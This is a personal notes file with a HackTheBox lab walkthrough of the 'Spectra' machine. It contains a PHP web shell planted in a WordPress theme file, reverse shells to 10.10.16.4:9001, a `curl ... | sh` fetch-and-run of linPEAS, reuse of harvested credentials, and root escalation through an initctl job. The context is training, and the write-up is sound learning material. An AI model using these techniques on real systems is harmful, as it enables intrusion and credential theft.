# Notes regarding the HackTheBox materials.
-------------------------------------------

## General Notes
-----------------
1. The VirtualBox network setting should be set to bridged adaptor to make machines pingable.

2. With changing machines, it may be needed to disconnect and reconnect with openvpn.


## Resources
------------
1. [Web Shells](https://www.acunetix.com/blog/articles/introduction-web-shells-part-1/)
2. [Web PowerShell](https://int0x33.medium.com/from-php-s-hell-to-powershell-heaven-da40ce840da8)
3. [Rerverse Shell Onelines](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
4. [GTFOBins](https://gtfobins.github.io/)


## Commands
------------
1. Network enumeration with `nmap`.
    - `nmap -sC -sV -oA <file-basename> <ipaddress>`
        - `-sC`: specify default scripts. Equivalent to `--script=default`.
        - `-sV`: probe open ports to determine service/version info.
        - `-oA`: Output in the three major formats at once.
        - to scan all ports add `-p-` switch at the end.

2. Wordpress scan with `wpscan`:
    - `wpscan --url <link> --detection-mode aggressive --plugins-detection aggressive -e ap -o <file>`
        - `-e ap`: enumerate all plugins.
        - `-o <file>`: output to <file>.
        - to enumerate the users:
            - `wpscam --url <link> -e u`
            - for aggressive detection mode use, `--detection-mode aggressive` switch.

3. In php, $_REQUEST is an associative array that by default contains the contents of $_GET, $_POST and $_COOKIE. 


## Boxes
---------

### Spectra
-----------
1. The path:

    - Run `nmap`, open ports are, `80: http`, `22: ssh`, `3306: my-sql`. 
        Not much information from nmap.
    
    - Determine the webpage is with wordpress, by opening the http port 
        in a browser after adding the ip to hosts file.
    - By examining the source page of the database error (the `Test` link at the webpage) 
        and by the `wp-die-message`, we infer it's a wordpress database error.
    
    - Examining the link of `Test` page, and checking the `spectra.htb/testing/` 
        directory we see an open listing!
    - The files ending in `*.php` will be rendered by the browser, we see a `wp-config.php.save` file, 
        we open it, there is nothing, we see the source by `Ctrl+u`, the reason is everything is 
        hidden by the browser between `<?php` and `>`.
    - We see from the file `wp-config.php.save` source the username and password for the database.
    - We try to login to the database with the provided username and password in the file:
        - `mysql -h 10.10.10.229 -u devteam -p -D dev`
        - we get: Host is not allowed to connect to this MySQL server
        - the password is fine, but the host is not allowed to login.
        - in MySQL when you create a user, the user is tied with the ip address loging in, 
            normally you are allowed only to login with the localhost, 127.0.0.1
        - this achieves nothing!

    - We try to `ssh` to the host with the MySQL credentials:
        - `ssh devteam@10.10.10.229` and the password `devteam01`, we can't. 

    - We try to open `spectra.htb/main/wp-login.php` for the wordpress login dashboard.
        - with the previous enumeration of the users with `wpscan` we try the username `administrator` 
            and the password we got from the `wp-config.php.save` file. Success!

    - The problem now is getting a shell (specifically a web shell)! We can do it through a plugin, but this has risk of ruining 
        the website, if there is any errors.

    - We choose an inactive theme, so if anything happens, the problem isn't visible. In theme editor 
        we select the TwentyNineteen theme.

    - In the theme editor, in the `404.php` file, after all the content we add the 
        `<?php system($_REQUEST['ippsec']); ?>`
        line, but because we get an error we try the head of the file, we go to the url:
        "http://spectra.htb/main/wp-content/themes/twentynineteen/404.php?ippsec=whoami"
        we get the `nginx` which is the user running the php file.

    - Above method does not work for getting a reverse shell. We copy from reverse shell cheetsheet website the one for php, 
        of course we change the ip for the one in htb website, which is `10.10.16.4` and the port for `9001`. We intercept the 
        GET method of the `404.php` file with burp suit. Send the request to repeater section of the burp suit. Change the mehod 
        for POST. We listen to port `9001` with `nc`:
            - `nc -lvnp 9001`
        we get the shell.

    - We are the nginx user. We look around, there is practically no usual tools to work with, by looking around we see the 
        `/etc/lsb-release`, by catting the file, we see that it's a chromeos system.

    - Now we try to privilage esclate ourselves. We use the `linPEAS.sh` script. We use curl to run the linPEAS scrip from our own 
        local system. Remember that our ip is `10.10.16.4`, and on the other we open a server using python on our end where the 
        `linPEAS` script is at. So on the machine we run:
            - `curl 10.10.16.4:8000 | sh`
                we pipe it to `sh` since we are not sure if there is a bash shell. On our local we open a server:
                    - `python -m http.server`

    - We let the script to scan the system. By looking around at the output of the program, we come across an `autologin`
        config file under `/opt`. By looking around we see a `/etc/autlogin/passwd`, by catting it we a password, `SummerHereWeCome!!`.

    - We see that there is a python3. We use it to get a tty to the machine. On the machine we run:
        - `python3.6 -m 'import pty;pty.spawn("/bin/bash")'`
    
    - We don't know which user, the found password, belongs to. We try to ssh with different user, finally `ssh katie@10.10.10.229` succeeds.

    - By looking around there is nothing in home directory of `katie`. We do `sudo -l` to see which programs this user can run using 
       sudo. We see a `/sbin/initctl`. We try to get a help for it. We get a help with `sudo /sbin/initctl help`. 

    - It seems that `initctl` is a way to manage processes and jobs. In `/etc/init` we see bunch of conf files.

    - We use `groups` to see whcih groups we are of, we see that are a memeber of `developers` group. By `ls -la` of `init` files, 
        we see that there are bunch of `test` conf files, that belong to `developers` group. This means that we can use `initctl` to 
        run these scripts as `root` user. We grab a reverse shell oneliner for python and `exec` it inside the `test` conf file. 

   - We stop and start the `test` job:
        - `sudo /sbin/initctl stop test`
        - `sudo /sbin/initctl star test`

   - We remember that in the oneliner for reverse shell, we change the ip for our own, `10.10.16.4` and use the port 9001, we listen to 
        it by `nc`:
            - `nc -lvnp 9001`
        and voilla, we have our root shell!


2. Questions:

    - Why added the 10.10.10.229 ip to `/etc/hosts` file for opening the new links in it in a browser?

